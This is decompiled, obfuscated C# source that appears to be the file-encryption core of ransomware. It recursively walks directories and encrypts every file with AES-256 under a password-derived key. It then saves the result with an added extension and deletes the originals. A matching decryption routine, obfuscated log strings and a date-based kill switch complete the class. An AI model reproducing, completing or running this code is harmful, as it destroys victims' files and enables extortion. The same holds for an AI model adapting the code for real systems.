using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class Class0
{
	public static int int_0;

	private static Class2 class2_0;

	private static string string_0;

	public static string string_1;

	public static string string_2;

	public static List<string> list_0;

	public static void smethod_0(string string_3)
	{
		try
		{
			string[] files = Directory.GetFiles(string_3);
			foreach (string text in files)
			{
				if (!text.Contains(string_0))
				{
					class2_0.method_1(Class11.smethod_0("\uf0f3\uf0d8\uf0d5\uf0c4\uf0cf\uf0c6\uf0c2\uf0df\uf0d8\uf0d1\uf08c\uf096", 61620) + text);
					list_0.Add(text);
					smethod_3(text, string_1);
				}
			}
			string[] directories = Directory.GetDirectories(string_3);
			foreach (string string_4 in directories)
			{
				smethod_0(string_4);
			}
		}
		catch (Exception ex)
		{
			class2_0.method_4(ex.Message);
		}
	}

	public static void smethod_1(string string_3)
	{
		try
		{
			string[] files = Directory.GetFiles(string_3);
			foreach (string text in files)
			{
				if (smethod_2(text))
				{
					class2_0.method_1(Class11.smethod_0("\ue8b7\ue896\ue890\ue881\ue88a\ue883\ue887\ue89a\ue89d\ue894\ue8c9\ue8d3", 59617) + text);
					smethod_4(text, text.Substring(0, text.Length - string_0.Length), string_2);
				}
			}
			string[] directories = Directory.GetDirectories(string_3);
			foreach (string string_4 in directories)
			{
				smethod_1(string_4);
			}
		}
		catch (Exception ex)
		{
			class2_0.method_4(ex.Message);
		}
	}

	private static bool smethod_2(string string_3)
	{
		if (string_3.Contains(string_0) && string_3.Substring(string_3.Length - string_0.Length, string_0.Length) == string_0)
		{
			return true;
		}
		return false;
	}

	private static void smethod_3(string string_3, string string_4)
	{
		byte[] array = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		rNGCryptoServiceProvider.Dispose();
		FileStream fileStream = new FileStream(string_3 + string_0, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(string_4);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(string_3, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			class2_0.method_4(ex.Message);
		}
		finally
		{
			class2_0.method_2(Class11.smethod_0("\ue398\ue3b3\ue3be\ue3a4\ue3ad\ue3a9\ue3b8\ue3b9\ue3fd", 58253) + string_3);
			int_0++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(string_3);
		}
	}

	private static void smethod_4(string string_3, string string_4, string string_5)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_5);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(string_3, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(string_4, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			class2_0.method_4(Class11.smethod_0("\uf5a8\uf599\uf592\uf59b\uf59f\uf584\uf58c\uf599\uf58a\uf59b\uf583\uf582\uf588\uf5ae\uf593\uf588\uf58e\uf59b\uf59f\uf582\uf584\uf585\uf5cb\uf58e\uf599\uf599\uf584\uf599\uf5d1\uf5cb", 62954) + ex.Message);
		}
		catch (Exception ex2)
		{
			class2_0.method_4(ex2.Message);
		}
		try
		{
			cryptoStream.Close();
			class2_0.method_2(Class11.smethod_0("\uf49f\uf4be\uf4b8\uf4a9\uf4a2\uf4ab\uf4af\uf4be\uf4bf\uf4e1\uf4fb", 62618) + string_3);
		}
		catch (Exception ex3)
		{
			class2_0.method_4(Class11.smethod_0("\ue69a\ue6ad\ue6ad\ue6b0\ue6ad\ue6ff\ue6bd\ue6a6\ue6ff\ue6bc\ue6b3\ue6b0\ue6ac\ue6b6\ue6b1\ue6b8\ue6ff\ue69c\ue6ad\ue6a6\ue6af\ue6ab\ue6b0\ue68c\ue6ab\ue6ad\ue6ba\ue6be\ue6b2\ue6e5\ue6ff", 58951) + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	static Class0()
	{
		if (DateTime.Now > new DateTime(637618908382304067L))
		{
			throw new Exception();
		}
		int_0 = 0;
		class2_0 = new Class2(Class11.smethod_0("\uef99\uef98\uef9f\uef88\uef9a", 61340), 0);
		string_0 = Class11.smethod_0("\uf293\uf2da\uf2d4\uf2cb\uf2d8\uf2d0\uf2d8\uf2d3\uf2d4\uf2c9\uf2cf\uf2d2", 62136);
		string_1 = Class4.string_4;
		list_0 = new List<string>();
	}
}
